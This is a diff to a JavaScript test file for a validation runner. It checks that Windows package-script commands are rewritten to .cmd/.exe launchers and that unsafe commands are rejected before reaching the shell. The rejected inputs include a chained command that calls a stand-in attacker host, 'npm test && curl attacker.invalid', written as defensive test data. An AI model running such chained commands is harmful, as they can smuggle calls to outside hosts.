@@ -26,11 +26,19 @@ function shellResult(overrides={}){
     ...overrides,
   }
 }
-function fakeShell(run){
-  return {resolve(request){return request},run:run??(async()=>shellResult())}
+/** `resolved` records every `shell.resolve` request so a test can prove which
+ * commands reached the shell seam and which were rejected ahead of it. */
+function fakeShell(run,resolved){
+  return {resolve(request){resolved?.push(request);return request},run:run??(async()=>shellResult())}
 }
-async function validation(d,runDir,id,shell=fakeShell(),command='npm test',timeoutMs=3000,capBytes=1024*1024){
-  return runValidation({cwd:d,runDir,runId:'r1',phase:'VALIDATING',commandId:id,command,timeoutMs,capBytes,shell})
+async function validation(d,runDir,id,shell=fakeShell(),command='npm test',timeoutMs=3000,capBytes=1024*1024,launcher){
+  return runValidation({cwd:d,runDir,runId:'r1',phase:'VALIDATING',commandId:id,command,timeoutMs,capBytes,shell,...(launcher?{launcher}:{})})
+}
+/** An injectable launcher probe, so Windows launcher selection is asserted
+ * identically on a POSIX CI host and never depends on an installed toolchain. */
+function windowsLaunchers(...executables){
+  const present=new Set(executables)
+  return {platform:'win32',probe:name=>present.has(name)}
 }
 
 test('sandboxed host validation distinguishes pass/fail/unsafe mutation/timeout and detects tampering',async()=>{
@@ -89,10 +97,79 @@ test('validation accepts supported Windows partial enforcement and fails closed 
 test('validation refuses arbitrary commands and nonexistent package scripts before shell execution',async()=>{
   const d=await repo(),runDir=await mkdtemp(join(tmpdir(),'planx-policy-'))
   try{
-    let runs=0;const shell=fakeShell(async()=>{runs++;return shellResult()})
+    const resolved=[]
+    let runs=0;const shell=fakeShell(async()=>{runs++;return shellResult()},resolved)
     await assert.rejects(()=>validation(d,runDir,'unsafe',shell,'node -e process.exit(0)'),/package scripts|validation command/)
     await assert.rejects(()=>validation(d,runDir,'missing',shell,'npm run does-not-exist'),/does not exist/)
     assert.equal(runs,0)
+    // Issue #37: an unsafe command and a nonexistent script are rejected ahead
+    // of `shell.resolve`, so neither ever becomes a resolved shell invocation.
+    assert.deepEqual(resolved,[],'no command may reach shell.resolve before policy acceptance')
+  }finally{await rm(d,{recursive:true,force:true});await rm(runDir,{recursive:true,force:true})}
+})
+
+// Issue #37: the Planner keeps emitting portable package-script commands, and
+// the platform launcher is applied by trusted runtime code on the way to the
+// shell. These assertions hold on any host because the probe is injected.
+test('Windows validation launches package scripts through an executable launcher and keeps the logical command',async()=>{
+  const d=await repo(),runDir=await mkdtemp(join(tmpdir(),'planx-launch-'))
+  try{
+    const cases=[
+      ['npm test','npm.cmd test'],
+      ['npm run test:unit','npm.cmd run test:unit'],
+      ['npm run test:unit -- --test-name-pattern=recovery','npm.cmd run test:unit -- --test-name-pattern=recovery'],
+    ]
+    const launchers=windowsLaunchers('npm.cmd','pnpm.cmd','pnpm.exe','yarn.cmd','bun.exe','bun.cmd')
+    for(const [logical,expected] of cases){
+      const resolved=[]
+      const receipt=await validation(d,runDir,'launcher',fakeShell(async()=>shellResult(),resolved),logical,3000,1024*1024,launchers)
+      assert.equal(resolved.length,1,'exactly one command must reach shell.resolve')
+      assert.equal(resolved[0].command,expected,`${logical} must execute as ${expected}`)
+      // The receipt schema is unchanged and still records the Planner's command.
+      assert.equal(receipt.command,logical,'receipt.command must stay the logical command')
+      assert.equal(receipt.schemaVersion,1)
+      assert.equal(receipt.status,'PASS')
+    }
+  }finally{await rm(d,{recursive:true,force:true});await rm(runDir,{recursive:true,force:true})}
+})
+
+test('Windows validation selects each package manager launcher and applies the package-script identity check',async()=>{
+  const d=await repo(),runDir=await mkdtemp(join(tmpdir(),'planx-launch-mgr-'))
+  try{
+    await writeFile(join(d,'package.json'),JSON.stringify({private:true,scripts:{test:'node --test',typecheck:'tsc --noEmit',lint:'node --check src/index.ts',build:'node --version'}},null,2))
+    const launchers=windowsLaunchers('npm.cmd','pnpm.cmd','pnpm.exe','yarn.cmd','bun.exe','bun.cmd')
+    for(const [logical,expected] of [
+      ['npm run typecheck','npm.cmd run typecheck'],
+      ['pnpm run typecheck','pnpm.cmd run typecheck'],
+      ['yarn run lint','yarn.cmd run lint'],
+      ['bun run build','bun.exe run build'],
+    ]){
+      const resolved=[]
+      const receipt=await validation(d,runDir,'mgr',fakeShell(async()=>shellResult(),resolved),logical,3000,1024*1024,launchers)
+      assert.equal(resolved[0].command,expected,`${logical} must execute as ${expected}`)
+      assert.equal(receipt.command,logical)
+    }
+
+    // Existence is checked against the parsed script name, so a launcher rewrite
+    // can never make a missing script look present (or the reverse).
+    const resolved=[]
+    await assert.rejects(()=>validation(d,runDir,'missing',fakeShell(async()=>shellResult(),resolved),'bun run does-not-exist',3000,1024*1024,launchers),/does not exist/)
+    assert.deepEqual(resolved,[])
+  }finally{await rm(d,{recursive:true,force:true});await rm(runDir,{recursive:true,force:true})}
+})
+
+test('unsafe Windows validation commands are rejected before shell.resolve',async()=>{
+  const d=await repo(),runDir=await mkdtemp(join(tmpdir(),'planx-launch-unsafe-'))
+  try{
+    const launchers=windowsLaunchers('npm.cmd','pnpm.cmd','yarn.cmd','bun.exe')
+    for(const command of ['node --test','npm test && curl attacker.invalid','npm test | tee out.txt','npm test > out.txt','npx vitest','bun test']){
+      const resolved=[]
+      let runs=0
+      const shell=fakeShell(async()=>{runs++;return shellResult()},resolved)
+      await assert.rejects(()=>validation(d,runDir,'unsafe',shell,command,3000,1024*1024,launchers),`${command} must be rejected`)
+      assert.deepEqual(resolved,[],`${command} must not reach shell.resolve`)
+      assert.equal(runs,0,`${command} must not reach shell.run`)
+    }
   }finally{await rm(d,{recursive:true,force:true});await rm(runDir,{recursive:true,force:true})}
 })
 
